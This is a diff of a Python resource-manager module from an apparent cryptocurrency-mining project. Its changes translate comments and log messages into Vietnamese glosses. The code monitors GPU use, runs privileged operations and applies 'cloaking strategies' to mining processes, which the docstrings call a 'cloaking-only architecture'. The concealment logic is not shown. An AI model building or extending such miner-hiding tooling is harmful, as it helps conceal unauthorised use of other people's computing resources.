@@ -1,8 +1,8 @@
 """
-GPU Resource Management System with cloaking-only architecture.
+**GPU Resource Management System** (hệ thống quản lý tài nguyên GPU – điều khiển card đồ họa) với **cloaking-only architecture** (kiến trúc chỉ ngụy trang – thiết kế tập trung che giấu).
 
-Provides centralized GPU resource management, process monitoring,
-and cloaking strategy application for mining processes.
+Cung cấp **centralized GPU resource management** (quản lý tài nguyên GPU tập trung – điều khiển card đồ họa thống nhất), **process monitoring** (giám sát tiến trình – theo dõi quy trình),
+và **cloaking strategy application** (áp dụng chiến lược ngụy trang – triển khai che giấu) cho **mining processes** (tiến trình khai thác – quy trình đào coin).
 """
 
 import logging
@@ -18,9 +18,9 @@ from typing import List, Any, Dict, Optional
 from pathlib import Path
 import os
 
-# Core project imports
+# **Core project imports** (import lõi dự án – nhập các module chính)
 from mining_environment.scripts.utils import MiningProcess, CloakRequest, CloakResult
-from mining_environment.scripts.cloak_strategies import CloakCoordinator  # NEW: Use coordinator instead of factory
+from mining_environment.scripts.cloak_strategies import CloakCoordinator  # MỚI: Sử dụng **coordinator** (điều phối viên – bộ phối hợp) thay vì **factory** (nhà máy – bộ tạo)
 from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
 from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 from mining_environment.scripts.privileged_operations import get_privileged_manager
@@ -28,17 +28,17 @@ from mining_environment.scripts.module_loggers import get_resource_manager_logge
 from mining_environment.scripts.error_management import get_error_reporter
 from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy
 
-# Module logger
+# **Module logger** (logger module – bộ ghi nhật ký thành phần)
 module_logger = get_resource_manager_logger()
 
 class SharedResourceManager:
     """
-    Shared resource manager for GPU operations.
+    **Shared resource manager** (trình quản lý tài nguyên dùng chung – bộ điều khiển tài nguyên chia sẻ) cho **GPU operations** (hoạt động GPU – thao tác card đồ họa).
     
-    Handles:
-    - NVML lifecycle management
-    - GPU usage monitoring
-    - Cloaking strategy application
+    **Handles** (xử lý – đảm nhiệm):
+    - **NVML lifecycle management** (quản lý vòng đời NVML – điều khiển chu kỳ thư viện NVIDIA)
+    - **GPU usage monitoring** (giám sát sử dụng GPU – theo dõi mức dùng card đồ họa)
+    - **Cloaking strategy application** (áp dụng chiến lược ngụy trang – triển khai che giấu)
     """
 
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
@@ -46,38 +46,38 @@ class SharedResourceManager:
         self.config = config
         self.resource_managers = resource_managers
         
-        # Strategy cache initialization
+        # **Strategy cache initialization** (khởi tạo bộ nhớ đệm chiến lược – thiết lập cache cho phương pháp)
         self.strategy_cache = get_strategy_cache(
             max_size=500,
             ttl_seconds=7200.0,
             eviction_policy=CacheEvictionPolicy.INTELLIGENT
         )
         
-        # Privileged operations manager
+        # **Privileged operations manager** (trình quản lý thao tác đặc quyền – bộ điều khiển quyền cao)
         self.privileged_manager = get_privileged_manager(logger)
         
-        # Security context validation
+        # **Security context validation** (xác thực ngữ cảnh bảo mật – kiểm tra môi trường an toàn)
         security_context = self.privileged_manager.validate_security_context()
         self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")
 
-        # NVML initialization with decoupling - non-blocking if NVML fails
+        # **NVML initialization** (khởi tạo NVML – thiết lập thư viện NVIDIA) với **decoupling** (tách rời – độc lập) - **non-blocking** (không chặn – không dừng) nếu **NVML fails** (NVML thất bại)
         self._nvml_init = False
         self._nvml_available = False
         
-        # Try NVML initialization without throwing exceptions on failure
+        # Thử **NVML initialization** (khởi tạo NVML) mà không **throwing exceptions** (ném ngoại lệ – báo lỗi) khi **failure** (thất bại)
         try:
             self.initialize_nvml()
             self.logger.info("SharedResourceManager initialized with NVML support")
         except Exception as e:
             self.logger.warning(f"NVML unavailable: {e}")
             self.logger.info("SharedResourceManager operating in fallback mode (no NVML)")
-            # Continue without raising exception - system continues with limited functionality
+            # Tiếp tục mà không **raising exception** (tạo ngoại lệ – báo lỗi) - hệ thống tiếp tục với **limited functionality** (chức năng hạn chế – tính năng giới hạn)
 
     def is_nvml_initialized(self) -> bool:
         return self._nvml_init
 
     def initialize_nvml(self) -> None:
-        """Thread-safe NVML initialization"""
+        """**Thread-safe NVML initialization** (khởi tạo NVML an toàn luồng – thiết lập thư viện NVIDIA không xung đột)"""
         if self._nvml_init:
             return
 
@@ -89,32 +89,32 @@ class SharedResourceManager:
             with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                 future = executor.submit(nvml_init_worker)
                 try:
-                    # Reduced timeout to prevent long blocking
+                    # **Reduced timeout** (thời gian chờ giảm – timeout ngắn) để **prevent long blocking** (ngăn chặn dài – tránh treo lâu)
                     timeout = getattr(self.config, 'nvml_init_timeout', 2.0) 
                     result = future.result(timeout=timeout)
                     if result:
                         self._nvml_init = True
                         self._nvml_available = True
-                        self.logger.info("NVML initialization successful")
+                        self.logger.info("**NVML initialization successful** (khởi tạo NVML thành công – thiết lập thư viện NVIDIA hoàn tất)")
                 except concurrent.futures.TimeoutError:
-                    self.logger.warning("NVML initialization timeout")
+                    self.logger.warning("**NVML initialization timeout** (hết thời gian khởi tạo NVML – quá thời gian chờ thiết lập)")
                     raise
         except Exception as e:
-            self.logger.error(f"NVML initialization failed: {e}")
+            self.logger.error(f"**NVML initialization failed** (khởi tạo NVML thất bại – thiết lập thư viện NVIDIA lỗi): {e}")
             raise
 
     def shutdown_nvml(self):
-        """**Safe NVML Shutdown** (tắt NVML an toàn)"""
+        """**Safe NVML Shutdown** (tắt NVML an toàn – đóng thư viện NVIDIA cẩn thận)"""
         if self._nvml_init:
             try:
                 pynvml.nvmlShutdown()
                 self._nvml_init = False
-                self.logger.info("NVML đã tắt")
+                self.logger.info("**NVML shutdown** (NVML đã tắt – thư viện NVIDIA đã đóng)")
             except Exception as e:
-                self.logger.error(f"Lỗi tắt NVML: {e}")
+                self.logger.error(f"**NVML shutdown error** (lỗi tắt NVML – thất bại đóng thư viện): {e}")
 
     def get_process_cache_usage(self, pid: int) -> float:
-        """**Get Process Cache Usage** (lấy cache usage của process)"""
+        """**Get Process Cache Usage** (lấy mức dùng cache của tiến trình – đo bộ nhớ đệm process sử dụng)"""
         try:
             if not self._nvml_init:
                 return 0.0
@@ -123,15 +123,15 @@ class SharedResourceManager:
             memory_info = process.memory_info()
             return float(memory_info.rss) / (1024 * 1024)  # MB
         except Exception as e:
-            self.logger.debug(f"Không thể lấy cache usage cho PID {pid}: {e}")
+            self.logger.debug(f"Không thể lấy **cache usage** (mức dùng cache – bộ nhớ đệm) cho **PID** {pid} (Process ID – mã tiến trình): {e}")
             return 0.0
 
     def get_gpu_usage_percent(self, pid: int) -> float:
-        """**Get GPU Usage Percent** (lấy phần trăm sử dụng GPU)"""
+        """**Get GPU Usage Percent** (lấy phần trăm sử dụng GPU – đo mức dùng card đồ họa)"""
         return self._sync_get_gpu_usage_percent(pid)
 
     def _sync_get_gpu_usage_percent(self, pid: int) -> float:
-        """**Synchronous GPU Usage Check** (kiểm tra sử dụng GPU đồng bộ)"""
+        """**Synchronous GPU Usage Check** (kiểm tra sử dụng GPU đồng bộ – đo mức dùng card đồ họa tuần tự)"""
         try:
             if not self._nvml_init:
                 return 0.0
@@ -147,17 +147,17 @@ class SharedResourceManager:
                         return float(utilization.gpu)
             return 0.0
         except Exception as e:
-            self.logger.debug(f"Không thể lấy GPU usage cho PID {pid}: {e}")
+            self.logger.debug(f"Không thể lấy **GPU usage** (mức dùng GPU – sử dụng card đồ họa) cho **PID** {pid} (Process ID – mã tiến trình): {e}")
             return 0.0
 
 class ResourceManager(IResourceManager):
     """
-    **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
+    **Main Resource Manager Class** (lớp quản lý tài nguyên chính – class điều khiển tài nguyên chủ đạo)
     
-    **Simplified Architecture** (kiến trúc đơn giản hóa):
-    - DirectPIDRegistry Observer-Based Cloaking
-    - No Process Discovery or Monitoring  
-    - Thread-Safe Singleton Pattern
+    **Simplified Architecture** (kiến trúc đơn giản hóa – thiết kế tối giản):
+    - **DirectPIDRegistry Observer-Based Cloaking** (ngụy trang dựa trên observer DirectPIDRegistry – che giấu theo mô hình quan sát)
+    - **No Process Discovery or Monitoring** (không khám phá hoặc giám sát tiến trình – bỏ qua tìm kiếm và theo dõi process)  
+    - **Thread-Safe Singleton Pattern** (mẫu singleton an toàn luồng – pattern đơn thể không xung đột)
     """
 
     _instance = None
@@ -166,17 +166,17 @@ class ResourceManager(IResourceManager):
     _initialization_lock = threading.RLock()
 
     def __new__(cls, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
-        """**Singleton Creation** (tạo singleton)"""
+        """**Singleton Creation** (tạo singleton – khởi tạo đơn thể duy nhất)"""
         with cls._instance_lock:
             if cls._instance is None:
                 cls._instance = super(ResourceManager, cls).__new__(cls)
-                module_logger.debug("ResourceManager Singleton Created")
+                module_logger.debug("**ResourceManager Singleton Created** (ResourceManager singleton đã tạo – đơn thể quản lý tài nguyên đã khởi tạo)")
         return cls._instance
 
     def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
-        """**Initialize ResourceManager** (khởi tạo ResourceManager)"""
+        """**Initialize ResourceManager** (khởi tạo ResourceManager – thiết lập trình quản lý tài nguyên)"""
         if getattr(self, '_initialized', False):
-            module_logger.debug("ResourceManager Singleton Already Initialized")
+            module_logger.debug("**ResourceManager Singleton Already Initialized** (ResourceManager singleton đã khởi tạo rồi – đơn thể đã được thiết lập)")
             return
 
         with self._initialization_lock:
@@ -186,40 +186,40 @@ class ResourceManager(IResourceManager):
             self.logger = get_resource_manager_logger()
             self.config = self._validate_configuration(config)
             
-            # **Core Components** (thành phần cốt lõi)
+            # **Core Components** (thành phần cốt lõi – các phần tử chính)
             self._stop_flag = False
             self.workers = []
             self.resource_adjustment_queue = queue.Queue()
             
-            # **🥇 SOLUTION D: EAGER INITIALIZATION FIX** (khởi tạo eager SharedResourceManager)
-            # Khởi tạo SharedResourceManager ngay lập tức để tránh race condition
+            # **🥇 SOLUTION D: EAGER INITIALIZATION FIX** (sửa lỗi khởi tạo eager – khắc phục thiết lập sớm)
+            # Khởi tạo **SharedResourceManager** ngay lập tức để tránh **race condition** (điều kiện đua – xung đột luồng)
             self._shared_resource_manager_lock = threading.Lock()
             self._shared_resource_manager_init_attempted = False
             
-            # **🥇 SOLUTION D: Eager initialization với error handling** (khởi tạo eager với xử lý lỗi)
+            # **🥇 SOLUTION D: Eager initialization** (khởi tạo sớm – thiết lập ngay) với **error handling** (xử lý lỗi – quản lý ngoại lệ)
             try:
-                self.logger.info("🔧 [EAGER-INIT] Bắt đầu khởi tạo SharedResourceManager...")
+                self.logger.info("🔧 [EAGER-INIT] Bắt đầu khởi tạo **SharedResourceManager** (trình quản lý tài nguyên dùng chung)...")
                 resource_managers = {'main': self}
                 self.shared_resource_manager = SharedResourceManager(
                     self.config, self.logger, resource_managers
                 )
-                self.logger.info("✅ [EAGER-INIT] SharedResourceManager khởi tạo thành công")
+                self.logger.info("✅ [EAGER-INIT] **SharedResourceManager** khởi tạo thành công (thiết lập trình quản lý dùng chung hoàn tất)")
                 
-                # **🥇 SOLUTION D: Signal ready sau khi SharedResourceManager sẵn sàng** (báo hiệu sẵn sàng)
+                # **🥇 SOLUTION D: Signal ready** (báo hiệu sẵn sàng – phát tín hiệu) sau khi **SharedResourceManager** sẵn sàng
                 self.signal_ready()
-                self.logger.info("✅ [EAGER-INIT] ResourceManager đã sẵn sàng nhận PID")
+                self.logger.info("✅ [EAGER-INIT] **ResourceManager** đã sẵn sàng nhận **PID** (Process ID – mã tiến trình)")
                 
             except Exception as e:
-                self.logger.warning(f"⚠️ [EAGER-INIT] SharedResourceManager khởi tạo thất bại: {e}")
-                self.logger.info("🔄 [EAGER-INIT] Hệ thống sẽ hoạt động ở chế độ giới hạn")
+                self.logger.warning(f"⚠️ [EAGER-INIT] **SharedResourceManager** khởi tạo thất bại (thiết lập trình quản lý dùng chung lỗi): {e}")
+                self.logger.info("🔄 [EAGER-INIT] Hệ thống sẽ hoạt động ở **limited mode** (chế độ giới hạn – hoạt động hạn chế)")
                 self.shared_resource_manager = None
-                # Vẫn signal ready để không block hệ thống
+                # Vẫn **signal ready** (báo hiệu sẵn sàng) để không **block** (chặn – dừng) hệ thống
                 self.signal_ready()
             
-            # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục)
-            self._pid_queue = queue.Queue()  # Queue for incoming PIDs from registry
-            self._monitored_processes = {}   # Dict[int, MiningProcess] - processes under cloaking
-            self._monitoring_interval = 30.0  # Monitor every 30 seconds
+            # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục – bổ sung thiết kế dịch vụ bền vững)
+            self._pid_queue = queue.Queue()  # **Queue** (hàng đợi) cho **incoming PIDs** (PID đến – mã tiến trình mới) từ **registry** (sổ đăng ký)
+            self._monitored_processes = {}   # Dict[int, MiningProcess] - **processes under cloaking** (tiến trình đang được ngụy trang – process đang che giấu)
+            self._monitoring_interval = 30.0  # **Monitor** (giám sát – theo dõi) mỗi 30 giây
             self._last_monitoring_cycle = 0.0
             self._cloaking_stats = {
                 'processes_cloaked': 0,
@@ -228,13 +228,13 @@ class ResourceManager(IResourceManager):
                 'monitoring_cycles': 0
             }
             
-            # **File-based scanner deprecated** (scanner dựa trên file đã deprecated)
-            # Replaced by IPC Bridge for cross-process communication
+            # **File-based scanner deprecated** (scanner dựa trên file đã lỗi thời – bộ quét theo file không dùng nữa)
+            # Thay thế bằng **IPC Bridge** (cầu IPC – kết nối liên tiến trình) cho **cross-process communication** (giao tiếp xuyên tiến trình – trao đổi giữa các process)
             
-            # **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry)
+            # **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry – kết nối sổ đăng ký PID trực tiếp)
             self._setup_direct_registry_observer()
             
-            # **🔥 IPC BRIDGE INTEGRATION** (tích hợp IPC Bridge)
+            # **🔥 IPC BRIDGE INTEGRATION** (tích hợp IPC Bridge – kết nối cầu liên tiến trình)
             self._ipc_server = None
             self._ipc_enabled = True
             self._ipc_stats = {
@@ -246,7 +246,7 @@ class ResourceManager(IResourceManager):
             self._setup_ipc_bridge()
             
             self._initialized = True
-            module_logger.info("ResourceManager khởi tạo thành công")
+            module_logger.info("**ResourceManager initialization successful** (ResourceManager khởi tạo thành công – thiết lập trình quản lý hoàn tất)")
 
     @classmethod
     def wait_for_ready(cls, timeout: float = 10.0) -> bool:
@@ -797,26 +797,26 @@ class ResourceManager(IResourceManager):
         # **🔥 Shutdown IPC Bridge Server** (tắt máy chủ IPC Bridge)
         if self._ipc_server and self._ipc_enabled:
             try:
-                self.logger.info("🌉 [IPC-BRIDGE] Shutting down IPC Bridge server...")
+                self.logger.info("🌉 [IPC-BRIDGE] Đang tắt **IPC Bridge server** (máy chủ cầu IPC – server kết nối liên tiến trình)...")
                 self._ipc_server.stop()
-                self.logger.info("✅ [IPC-BRIDGE] IPC Bridge server stopped")
+                self.logger.info("✅ [IPC-BRIDGE] **IPC Bridge server stopped** (máy chủ cầu IPC đã dừng – server kết nối đã tắt)")
             except Exception as e:
-                self.logger.error(f"❌ [IPC-BRIDGE] Error shutting down IPC server: {e}")
+                self.logger.error(f"❌ [IPC-BRIDGE] Lỗi tắt **IPC server** (máy chủ IPC – server liên tiến trình): {e}")
         
-        # **Shutdown NVML** (tắt NVML)
+        # **Shutdown NVML** (tắt NVML – đóng thư viện NVIDIA)
         if self.shared_resource_manager:
             try:
                 self.shared_resource_manager.shutdown_nvml()
             except Exception as e:
-                self.logger.error(f"Lỗi tắt NVML: {e}")
+                self.logger.error(f"**NVML shutdown error** (lỗi tắt NVML – thất bại đóng thư viện): {e}")
 
-        self.logger.info("ResourceManager đã tắt")
+        self.logger.info("**ResourceManager shutdown complete** (ResourceManager đã tắt – trình quản lý tài nguyên đã đóng)")
 
     def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
         """
-        **TIER 2 FIX: Enhanced Receive PID from DirectPIDRegistry** (nhận PID từ DirectPIDRegistry nâng cao)
+        **TIER 2 FIX: Enhanced Receive PID from DirectPIDRegistry** (sửa lỗi cấp 2: nhận PID từ DirectPIDRegistry nâng cao – cải tiến nhận mã tiến trình từ sổ đăng ký)
         
-        **Critical Interface Method** (phương thức giao diện quan trọng) cho DirectPIDRegistry → ResourceManager handoff.
+        **Critical Interface Method** (phương thức giao diện quan trọng – hàm interface then chốt) cho **DirectPIDRegistry → ResourceManager handoff** (chuyển giao từ sổ đăng ký sang trình quản lý – bàn giao PID).
         
         Args:
             pid: Process ID to apply cloaking
